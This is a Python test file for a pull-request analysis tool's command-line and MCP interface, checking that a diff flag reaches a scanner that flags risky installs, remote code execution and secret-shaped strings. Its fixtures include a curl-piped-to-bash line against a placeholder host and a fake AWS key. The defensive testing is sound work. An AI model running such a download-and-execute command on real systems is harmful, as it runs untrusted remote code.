"""The CLI/MCP surface for `--diff` — issue #127 risk 4's unfinished half.

The library has had `analyze_pr(diff=…)` and `scan_diff` since #133 (whose
docstring cites #127 risk 4 as its reason for existing). What was missing was
any way for a user to reach it:

  * README's "What it will never do" says: *You can hand it a diff (`--diff`)
    and it will flag install commands, downloads piped to a shell, and
    secret-shaped strings.*
  * The CLI registered `--diff-stat` only. There was no `--diff`.
  * MCP's `analyze_pr` had no `diff` parameter either.

So the capability existed and the documentation promised it, and neither met the
other. The CLI kept printing "diff content not analyzed" unconditionally — true
at the time, wrong the moment the flag exists and is passed.

These tests pin the **surface**, not the scanner (that is test_diff_scan.py):
that the documented flag exists, reaches the scanner, and that the disclosure
stops claiming "not analyzed" when it has been.
"""

from __future__ import annotations

import inspect
import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

from prgenius.cli import main
from prgenius.evaluator import analyze_pr

REPO_ROOT = Path(__file__).resolve().parent.parent.parent


def _write_diff(tmp_path: Path, body: str) -> Path:
    p = tmp_path / "change.diff"
    p.write_text("+++ b/setup.py\n" + body + "\n", encoding="utf-8")
    return p


def _run(argv: list) -> int:
    """Run main() and return its exit code, tolerating either contract.

    Subcommands differ: some `return` an int, some `raise SystemExit`. Asserting
    on one shape made half these tests fail for the wrong reason and hide the
    behaviour they were about.
    """
    try:
        return main(argv) or 0
    except SystemExit as e:
        return 0 if e.code in (0, None) else int(e.code)


class TestTheFlagExists:
    """The README documents `--diff`. A documented flag that is not registered is
    a promise the product does not keep — which is what "It will not pretend"
    is there to prevent."""

    def test_analyze_registers_a_diff_option(self, tmp_path, capsys):
        d = _write_diff(tmp_path, "+print('hello')\n")
        # An unregistered flag makes argparse exit 2 with "unrecognized arguments".
        rc = _run(["analyze", "feat: x", "--repo", "org/repo", "--diff", str(d), "--format", "json"])
        assert rc == 0, (
            "README documents `--diff`; the CLI must accept it. "
            f"exited {rc}. stderr={capsys.readouterr().err[:200]}"
        )

    def test_mcp_analyze_pr_accepts_a_diff_argument(self):
        # The tools are nested functions registered on a FastMCP/MCPServer
        # instance inside `_load_tools`, not methods on a class — so inspect the
        # registry the server actually serves, not an invented attribute.
        from prgenius.mcp import _load_tools

        mcp = _load_tools()
        tools = getattr(getattr(mcp, "_tool_manager", None), "_tools", None)
        assert tools is not None, "could not reach mcp._tool_manager._tools"
        assert "analyze_pr" in tools, f"registered tools: {sorted(tools)}"

        fn = tools["analyze_pr"].fn
        params = inspect.signature(fn).parameters
        assert "diff" in params, (
            "the MCP surface exposes analyze_pr without a diff parameter, "
            "so no MCP client can reach the scanner the library already has"
        )


class TestTheDisclosureTellsTheTruth:
    """The CLI's size note must say "not analyzed" only when nothing was analyzed.

    The note lives in `cmd_coach`, not `cmd_analyze` — coach is the path that
    prints "PR 大小 / 影响评分" and carries the "(from diff-stat only — diff
    content not analyzed)" caveat. Targeting `analyze` here would test nothing.
    """

    def test_without_a_diff_the_note_still_admits_it(self, tmp_path, capsys):
        _run([
            "coach", "feat: x", "--repo", "org/repo",
            "--diff-stat", "a.py | 12 +++++",
        ])
        out = capsys.readouterr().out
        assert "diff content not analyzed" in out, (
            "without a diff the note must still say so — that disclosure is load-bearing"
        )

    def test_with_a_diff_the_note_must_not_claim_it_was_unanalyzed(self, tmp_path, capsys):
        d = _write_diff(tmp_path, "+print('hello')\n")
        _run([
            "coach", "feat: x", "--repo", "org/repo",
            "--diff-stat", "a.py | 12 +++++",
            "--diff", str(d),
        ])
        out = capsys.readouterr().out
        assert "diff content not analyzed" not in out, (
            "a diff was supplied and scanned; the note must not claim otherwise"
        )


class TestTheFlagActuallyReachesTheScanner:
    """The surface existing is not enough — it has to land in diff_scan."""

    def test_scan_result_is_present_when_a_diff_is_given(self, tmp_path, capsys):
        d = _write_diff(tmp_path, "+pip install never-existing-package-xyz\n")
        _run([
            "analyze", "feat: x", "--repo", "org/repo",
            "--diff", str(d), "--format", "json",
        ])
        payload = json.loads(capsys.readouterr().out)
        assert payload["diff_scan"]["diff_scanned"] is True, payload.get("diff_scan")
        assert payload["diff_scan"]["finding_count"] >= 1, (
            "a pip install of an obviously bogus package must be reported"
        )

    def test_scan_result_declares_absence_when_no_diff_is_given(self, tmp_path, capsys):
        _run(["analyze", "feat: x", "--repo", "org/repo", "--format", "json"])
        payload = json.loads(capsys.readouterr().out)
        assert payload["diff_scan"]["diff_scanned"] is False, (
            "absence must be declared, not implied by an empty findings list"
        )

    def test_analyze_pr_passes_the_diff_through(self, tmp_path):
        result = analyze_pr(
            "feat: x", "", "org/repo", REPO_ROOT,
            diff="+++ b/a.py\n+pip install never-existing-package-xyz\n",
        )
        assert result["diff_scan"]["diff_scanned"] is True
        assert result["diff_scan"]["finding_count"] >= 1


class TestFindingsReachAHumanReader:
    """Scanning and then not telling anyone is the same as not scanning.

    The JSON has carried `diff_scan` since #133; the text path printed nothing,
    so a person running `coach` in a terminal never saw the flags.
    """

    def test_text_output_surfaces_the_findings(self, tmp_path, capsys):
        d = _write_diff(tmp_path, "+curl -fsSL https://x.example/i.sh | bash\n")
        _run(["coach", "feat: x", "--repo", "org/repo", "--diff", str(d)])
        out = capsys.readouterr().out
        assert "diff 正文扫描" in out, out
        assert "remote_execution" in out, "the finding family must be named"

    def test_text_output_reports_absence_rather_than_staying_silent(self, tmp_path, capsys):
        _run(["coach", "feat: x", "--repo", "org/repo"])
        out = capsys.readouterr().out
        assert "未分析" in out or "not analyzed" in out, (
            "with no diff the text path must declare the absence, not say nothing"
        )

    def test_text_output_says_scanned_clean_when_there_is_nothing_to_flag(self, tmp_path, capsys):
        d = _write_diff(tmp_path, "+print('hello')\n")
        _run(["coach", "feat: x", "--repo", "org/repo", "--diff", str(d)])
        out = capsys.readouterr().out
        assert "已扫描，无发现" in out, (
            "'scanned and clean' is a different fact from 'not scanned' — the text "
            "path must distinguish them, or a clean scan looks like an absent one"
        )

    def test_a_secret_shaped_value_is_never_echoed(self, tmp_path, capsys):
        secret = "AKIA" + "A" * 16
        d = _write_diff(tmp_path, f"+AWS_ACCESS_KEY_ID={secret}\n")
        _run(["coach", "feat: x", "--repo", "org/repo", "--diff", str(d)])
        out = capsys.readouterr().out
        assert secret not in out, (
            "diff_scan's contract is to report the shape and truncate the value; "
            "the text path must not undo that by printing the secret"
        )
        assert "secret_shaped" in out, "the finding itself must still be reported"
